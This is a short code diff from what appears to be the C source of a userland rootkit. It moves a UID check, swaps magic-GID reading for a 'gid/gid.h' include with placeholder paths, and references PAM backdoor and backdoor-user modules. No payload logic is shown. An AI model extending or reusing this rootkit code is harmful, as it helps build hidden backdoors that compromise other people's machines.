@@ -16,7 +16,6 @@
 #define MODE_CMDLINE  0x02   /* to get just the process name or its full */
                              /* cmdline entry. */
 
-void fallbackme(char **dest);
 char *get_cmdline(pid_t pid);
 int  open_cmdline(pid_t pid);
 
@@ -40,14 +39,11 @@ int chown_path(char *path, gid_t gid){
     return (long)call(CCHOWN, path, 0, gid);
 }
 
-/* if the toggle for this functionality isn't enabled, readgid()
- * just returns MAGIC_GID. */
-#ifdef READ_GID_FROM_FILE
-#define GID_PATH "??GID_PATH??" // [READ_GID_FROM_FILE]
-int changerkgid(gid_t *new);
-#endif
-gid_t readgid(void);
-#include "readgid.c"
+int not_user(int id){
+    if(getuid() != id && geteuid() != id)
+        return 1;
+    return 0;
+}
 
 /* if PAM is being used... */
 #if defined(USE_PAM_BD) || defined(LOG_LOCAL_AUTH)
@@ -79,12 +75,9 @@ do{                            \
 
 #endif
 
-int not_user(int id){
-    if(getuid() != id && geteuid() != id)
-        return 1;
-    return 0;
-}
-
+#define GID_PATH "??GID_PATH??" // [READ_GID_FROM_FILE]
+#define GIDTIME_PATH "??GIDTIME_PATH??" // [AUTO_GID_CHANGER]
+#include "gid/gid.h"
 void unset_bad_vars(void);
 int is_bdusr(void);
 #include "bdusr.c"
